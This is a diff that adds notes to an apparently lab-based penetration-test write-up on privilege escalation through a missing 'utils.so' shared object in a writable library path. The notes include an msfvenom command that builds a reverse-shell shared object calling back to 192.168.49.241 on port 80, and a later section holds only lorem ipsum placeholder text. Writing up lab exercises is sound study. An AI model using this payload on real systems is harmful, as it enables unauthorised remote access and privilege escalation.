@@ -254,7 +254,18 @@ Enumerated top 200 UDP ports:
 ![](Pasted%20image%2020221110143741.png)
 #SharedObjectsPriviliegeEscalation #PrivilegeEscalation
 
+#### -Per the above output the binary uses shared objects and "utils.so" shared objects file is not found
 
+#### -Attempted to utilize an exploit (and upload it to the writeable /usr/local/lib/dev directory) for the missing shared objects in the library path, found in HackTricks website but was unsuccessful:
+
+![](Pasted%20image%2020221110144101.png)
+
+#### -Googled "msfvenom shared object cheat sheet" and found the following syntax:
+
+![](Pasted%20image%2020221110144231.png)
+![](Pasted%20image%2020221110144301.png)
+
+#### -Typed "msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.49.241 LPORT=80 -f elf-so > utils.so" utilizing the above syntax structure found on my kali machine to create the reverse shell payload:
 
 ## Privilege Escalation vector
 Lorem ipsum dolor sit amet, consectetur adipiscing elit. Quisque sit amet tortor scelerisque, fringilla sapien sit amet, rhoncus lorem. Nullam imperdiet nisi ut tortor eleifend tincidunt. Mauris in aliquam orci. Nam congue sollicitudin ex, sit amet placerat ipsum congue quis. Maecenas et ligula et libero congue sollicitudin non eget neque. Phasellus bibendum ornare magna. Donec a gravida lacus.
